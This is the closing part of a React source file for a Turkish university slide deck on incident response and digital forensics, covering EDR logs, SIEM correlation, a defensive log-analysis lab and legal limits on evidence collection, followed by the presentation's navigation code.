            <tr>
              <td className="text-white font-semibold">Uç nokta (EDR)</td>
              <td>süreç oluşturma · komut satırı</td>
              <td>Hangi süreç neyi başlattı — yanal hareket, kalıcılık.</td>
            </tr>
          </tbody>
        </table>
      </motion.div>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.8 }}
        className="mt-4 text-[11px] text-gray-500 flex items-center gap-2 font-mono"
      >
        <Clock className="w-3.5 h-3.5 text-[#06b6d4]" />
        Hepsinin saati senkron olmalı (NTP) — yoksa zaman çizelgesi karışır.
      </motion.div>
    </SlideShell>
  ),

  /* ───── 15. Log analiz mockup ───── */
  () => (
    <SlideShell>
      <Eyebrow>Canlı örnek · auth.log okuma</Eyebrow>
      <H2 className="mb-2">Loglardan saldırı zincirini çıkar</H2>
      <Sub className="max-w-3xl mb-6">
        Tek satır bir şey söylemez; satırların <span className="text-white">sırası</span> hikâyeyi anlatır.
        Aşağıda başarısız denemeler, ardından başarılı giriş ve dışarıdan betik indirme adım adım görünüyor.
      </Sub>
      <LogAnalysisWindow />
    </SlideShell>
  ),

  /* ───── 16. SIEM & korelasyon ───── */
  () => (
    <SlideShell>
      <Eyebrow>Ölçeklenince · SIEM</Eyebrow>
      <H2 className="mb-2">Binlerce makine, milyonlarca satır</H2>
      <Sub className="max-w-3xl mb-8">
        Tek tek <span className="font-mono text-[#67e8f9]">grep</span> küçük ölçekte iş görür; kurumda loglar
        merkezîleştirilir ve <span className="text-white">SIEM</span> ile korelasyon kuralları otomatik alarm üretir.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-4 gap-3">
        {[
          { num: "01", title: "Topla", icon: Boxes, color: "#06b6d4", desc: "Tüm kaynaklardan logları merkezî bir noktaya akıt (forwarder/agent)." },
          { num: "02", title: "Normalize et", icon: ScrollText, color: "#22d3ee", desc: "Farklı formatları ortak alanlara çevir (zaman, IP, kullanıcı, olay)." },
          { num: "03", title: "Koreleasyon", icon: Search, color: "#fbbf24", desc: "Kurallar: &apos;5 dk içinde 10 başarısız + 1 başarılı giriş&apos; → alarm." },
          { num: "04", title: "Alarm & yanıt", icon: Siren, color: "#f87171", desc: "Olay açılır, ekip bilgilendirilir; müdahale döngüsü başlar." },
        ].map((s, i) => (
          <motion.div
            key={s.num}
            initial={{ opacity: 0, y: 24 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.1 + i * 0.1 }}
            className="sgbh-card rounded-xl p-5 flex flex-col"
          >
            <div className="flex items-center justify-between mb-3">
              <span className="text-[9px] font-mono uppercase tracking-widest" style={{ color: s.color }}>{s.num}</span>
              <s.icon className="w-5 h-5" style={{ color: s.color }} />
            </div>
            <div className="text-base font-semibold text-white mb-2">{s.title}</div>
            <p className="text-[12px] text-gray-400 leading-relaxed" dangerouslySetInnerHTML={{ __html: s.desc }} />
          </motion.div>
        ))}
      </div>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.7 }}
        className="mt-6 text-[11px] text-gray-500 font-mono max-w-4xl"
      >
        Örnek araçlar: Splunk, Elastic (ELK), Microsoft Sentinel, Wazuh — hepsi aynı boru hattını kurar.
      </motion.div>
    </SlideShell>
  ),

  /* ───── 17. Uygulamalı lab ───── */
  () => (
    <SlideShell>
      <Eyebrow>Bu hafta · uygulamalı lab</Eyebrow>
      <H2>Kendi sanal makinende dört adım</H2>
      <Sub className="mt-3 max-w-3xl">
        Lab tamamen kendi izole ortamında. Sana verilen örnek <span className="font-mono text-[#67e8f9]">auth.log</span> /
        <span className="font-mono text-[#67e8f9]"> access.log</span> üzerinde çalış; sonuçları kısa bir olay raporuyla teslim et.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-8">
        {[
          { icon: Terminal, title: "Saldırgan IP&apos;sini bul", desc: "grep / awk ile en çok başarısız giriş üreten IP&apos;yi çıkar; sonra aynı IP&apos;den başarılı giriş var mı bak.", accent: "#fbbf24" },
          { icon: Clock, title: "Zaman çizelgesi kur", desc: "İlk denemeden ele geçirmeye kadar olayları kronolojik sırala; dwell time&apos;ı tahmin et.", accent: "#06b6d4" },
          { icon: Hash, title: "Bir dosyayı doğrula", desc: "Verilen kanıt dosyasının SHA-256&apos;sını hesapla; beklenen değerle karşılaştırıp eşleşmeyi yaz.", accent: "#34d399" },
          { icon: ClipboardCheck, title: "Mini olay raporu", desc: "Ne oldu, nasıl girildi, hangi kanıt — 5 cümle. Bir de chain of custody satırı doldur.", accent: "#a78bfa" },
        ].map((t, i) => (
          <motion.div
            key={t.title}
            initial={{ opacity: 0, x: i % 2 === 0 ? -20 : 20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ delay: 0.15 + i * 0.1 }}
            className="sgbh-card sgbh-card-hover rounded-xl p-5 flex items-start gap-4"
          >
            <div
              className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
              style={{ background: `${t.accent}18`, border: `1px solid ${t.accent}55` }}
            >
              <t.icon className="w-5 h-5" style={{ color: t.accent }} />
            </div>
            <div>
              <div className="flex items-center gap-2 mb-1">
                <span className="w-5 h-5 rounded-full border border-gray-600 flex items-center justify-center text-[10px] text-gray-500 font-mono">{i + 1}</span>
                <h3 className="text-base font-semibold text-white" dangerouslySetInnerHTML={{ __html: t.title }} />
              </div>
              <p className="text-sm text-gray-400 leading-relaxed" dangerouslySetInnerHTML={{ __html: t.desc }} />
            </div>
          </motion.div>
        ))}
      </div>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.7 }}
        className="mt-6 sgbh-card-warn rounded-lg px-4 py-3 text-xs text-gray-300 flex items-start gap-3 max-w-4xl"
      >
        <Scale className="w-4 h-4 text-[#f87171] mt-0.5 flex-shrink-0" />
        <span>
          <span className="text-white">Hukuki hatırlatma:</span> Gerçek bir olayda kanıt toplama yetki ister.
          Usule aykırı toplanan delil mahkemede geçersiz sayılabilir; lab verileri yalnızca eğitim amaçlıdır.
        </span>
      </motion.div>
    </SlideShell>
  ),

  /* ───── 16. Sıradaki hafta + kapanış ───── */
  () => (
    <SlideShell>
      <div className="text-center">
        <motion.div
          initial={{ opacity: 0, scale: 0.7 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.7 }}
          className="inline-flex w-24 h-24 rounded-2xl items-center justify-center mb-8"
          style={{ background: "linear-gradient(135deg,#a78bfa,#6d28d9)", boxShadow: "0 30px 80px -20px rgba(167,139,250,0.6)" }}
        >
          <Scale className="w-12 h-12 text-white" />
        </motion.div>
        <Eyebrow>12. hafta tamamlandı · sıradaki: Bilişim Hukuku</Eyebrow>
        <H1>
          <span className="sgbh-shimmer-soft">Kanıttan hükme</span>
        </H1>
        <Sub className="mt-6 max-w-2xl mx-auto">
          Bu hafta kanıtı bozmadan topladık ve loglardan zinciri çıkardık. Hafta 13&apos;te
          bu kanıtın hukuki tarafına geçiyoruz: 5651, KVKK ve TCK 243-245 ışığında dijital delil.
        </Sub>
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mt-10 max-w-4xl mx-auto">
          <FeatureCard icon={Scale} title="TCK 243-245" desc="Bilişim sistemlerine girme ve verileri bozma suçları." accent="#a78bfa" delay={0.1} />
          <FeatureCard icon={Shield} title="KVKK" desc="Kişisel veri ihlali bildirimi ve yükümlülükler." accent="#06b6d4" delay={0.18} />
          <FeatureCard icon={ScrollText} title="5651" desc="İnternet aktörleri ve log saklama yükümlülüğü." accent="#34d399" delay={0.26} />
          <FeatureCard icon={FileSignature} title="Delil değeri" desc="Dijital delilin mahkemede kabulü ve sınırları." accent="#fbbf24" delay={0.34} />
        </div>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-10 max-w-3xl mx-auto text-left">
          <div className="sgbh-card rounded-xl p-5">
            <Calendar className="w-5 h-5 text-[#06b6d4] mb-3" />
            <div className="text-xs uppercase tracking-widest text-gray-500 font-mono mb-1">Ders saati</div>
            <div className="text-white font-semibold">Çarşamba</div>
            <div className="text-sm text-gray-400">13:30 — 17:00</div>
          </div>
          <div className="sgbh-card rounded-xl p-5">
            <Target className="w-5 h-5 text-[#a78bfa] mb-3" />
            <div className="text-xs uppercase tracking-widest text-gray-500 font-mono mb-1">Hazırlık</div>
            <div className="text-white font-semibold">Örnek loglar</div>
            <div className="text-sm text-gray-400">lab dosyalarını indir</div>
          </div>
          <div className="sgbh-card rounded-xl p-5">
            <Brain className="w-5 h-5 text-[#34d399] mb-3" />
            <div className="text-xs uppercase tracking-widest text-gray-500 font-mono mb-1">Teslim</div>
            <div className="text-white font-semibold">Mini olay raporu</div>
            <div className="text-sm text-gray-400">zaman çizelgesi + hash</div>
          </div>
        </div>
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 1, duration: 0.6 }}
          className="mt-10 text-xs font-mono text-gray-600 flex items-center justify-center gap-2"
        >
          <Sparkles className="w-3.5 h-3.5" />
          <span>Kanıtı koru · zinciri belgelE · yalnızca yetkin olduğun sistemde çalış</span>
        </motion.div>
      </div>
    </SlideShell>
  ),
];

const TOTAL = slides.length;

/* ============================================================
   PRESENTATION ROOT
   ============================================================ */

export default function Presentation() {
  const [current, setCurrent] = useState(0);
  const [direction, setDirection] = useState(1);
  const [isFs, setIsFs] = useState(false);

  const next = useCallback(() => {
    setDirection(1);
    setCurrent((c) => Math.min(c + 1, TOTAL - 1));
  }, []);
  const prev = useCallback(() => {
    setDirection(-1);
    setCurrent((c) => Math.max(c - 1, 0));
  }, []);

  useEffect(() => {
    function onKey(e: KeyboardEvent) {
      if (e.key === "ArrowRight" || e.key === " " || e.key === "PageDown") {
        e.preventDefault();
        next();
      } else if (e.key === "ArrowLeft" || e.key === "PageUp") {
        e.preventDefault();
        prev();
      } else if (e.key.toLowerCase() === "f") {
        if (!document.fullscreenElement) {
          document.documentElement.requestFullscreen?.();
        } else {
          document.exitFullscreen?.();
        }
      } else if (e.key === "Home") {
        setDirection(-1);
        setCurrent(0);
      } else if (e.key === "End") {
        setDirection(1);
        setCurrent(TOTAL - 1);
      }
    }
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [next, prev]);

  useEffect(() => {
    function onFs() {
      setIsFs(Boolean(document.fullscreenElement));
    }
    document.addEventListener("fullscreenchange", onFs);
    return () => document.removeEventListener("fullscreenchange", onFs);
  }, []);

  const touch = useRef<{ x: number } | null>(null);

  const slideContent = slides[current](true);
  const progress = ((current + 1) / TOTAL) * 100;

  return (
    <div
      className="fixed inset-0 bg-black overflow-hidden text-white"
      onTouchStart={(e) => {
        touch.current = { x: e.touches[0].clientX };
      }}
      onTouchEnd={(e) => {
        if (!touch.current) return;
        const dx = e.changedTouches[0].clientX - touch.current.x;
        if (Math.abs(dx) > 60) (dx > 0 ? prev : next)();
        touch.current = null;
      }}
    >
      <div className="absolute top-0 left-0 right-0 h-[3px] bg-white/5 z-50">
        <motion.div
          className="h-full"
          style={{
            background: "linear-gradient(90deg, #06b6d4, #67e8f9, #06b6d4)",
            boxShadow: "0 0 16px rgba(6,182,212,0.6)",
          }}
          animate={{ width: `${progress}%` }}
          transition={{ duration: 0.5, ease: [0.22, 1, 0.36, 1] }}
        />
      </div>

      <div className="absolute top-0 left-0 right-0 z-40 flex items-center justify-between px-8 py-4 text-[10px] font-mono uppercase tracking-wider">
        <div className="text-[#06b6d4]/70">
          BVA 2205 · 12. Hafta · Olay Müdahalesi &amp; DFIR
        </div>
        <div className="flex items-center gap-3">
          <div className="text-[#06b6d4]/50">
            <span className="text-[#06b6d4]">
              {String(current + 1).padStart(2, "0")}
            </span>
            <span className="mx-1">/</span>
            {String(TOTAL).padStart(2, "0")}
          </div>
          <button
            onClick={() => {
              if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen?.();
              } else {
                document.exitFullscreen?.();
              }
            }}
            className="p-1.5 text-gray-500 hover:text-[#06b6d4] transition-colors"
            aria-label="Tam ekran"
          >
            {isFs ? <Minimize2 className="w-4 h-4" /> : <Maximize2 className="w-4 h-4" />}
          </button>
        </div>
      </div>

      <AnimatePresence mode="wait" custom={direction}>
        <motion.div
          key={current}
          custom={direction}
          initial={{ opacity: 0, x: direction * 60 }}
          animate={{ opacity: 1, x: 0 }}
          exit={{ opacity: 0, x: -direction * 30 }}
          transition={{ duration: 0.4, ease: [0.22, 1, 0.36, 1] }}
          className="absolute inset-0"
        >
          {slideContent}
        </motion.div>
      </AnimatePresence>

      <button
        onClick={prev}
        disabled={current === 0}
        aria-label="Önceki slayt"
        className="absolute left-0 top-12 bottom-16 w-[12%] z-30 cursor-w-resize disabled:cursor-default opacity-0"
      />
      <button
        onClick={next}
        disabled={current === TOTAL - 1}
        aria-label="Sonraki slayt"
        className="absolute right-0 top-12 bottom-16 w-[12%] z-30 cursor-e-resize disabled:cursor-default opacity-0"
      />

      <div className="absolute bottom-0 left-0 right-0 z-40 px-8 py-4 flex items-center justify-between border-t border-white/5 bg-black/60 backdrop-blur">
        <button
          onClick={prev}
          disabled={current === 0}
          className="flex items-center gap-2 px-4 py-2 text-xs text-gray-500 hover:text-[#06b6d4] disabled:opacity-20 disabled:cursor-not-allowed transition-colors"
        >
          <ChevronLeft className="w-4 h-4" />
          Önceki
        </button>
        <div className="flex items-center gap-1 max-w-[60%] overflow-hidden">
          {Array.from({ length: TOTAL }).map((_, i) => (
            <button
              key={i}
              onClick={() => {
                setDirection(i > current ? 1 : -1);
                setCurrent(i);
              }}
              aria-label={`Slayt ${i + 1}`}
              className={`h-1.5 rounded-full transition-all ${
                i === current
                  ? "w-5 bg-[#06b6d4]"
                  : "w-1.5 bg-white/15 hover:bg-white/40"
              }`}
              style={
                i === current
                  ? { boxShadow: "0 0 10px rgba(6,182,212,0.6)" }
                  : undefined
              }
            />
          ))}
        </div>
        <button
          onClick={next}
          disabled={current === TOTAL - 1}
          className="flex items-center gap-2 px-4 py-2 text-xs text-gray-500 hover:text-[#06b6d4] disabled:opacity-20 disabled:cursor-not-allowed transition-colors"
        >
          Sonraki
          <ChevronRight className="w-4 h-4" />
        </button>
      </div>

      <div className="absolute bottom-3 right-8 text-[9px] font-mono text-gray-700 z-50 hidden md:flex items-center gap-2">
        <Keyboard className="w-3 h-3" />
        <span>← → · F · Esc</span>
      </div>
    </div>
  );
}
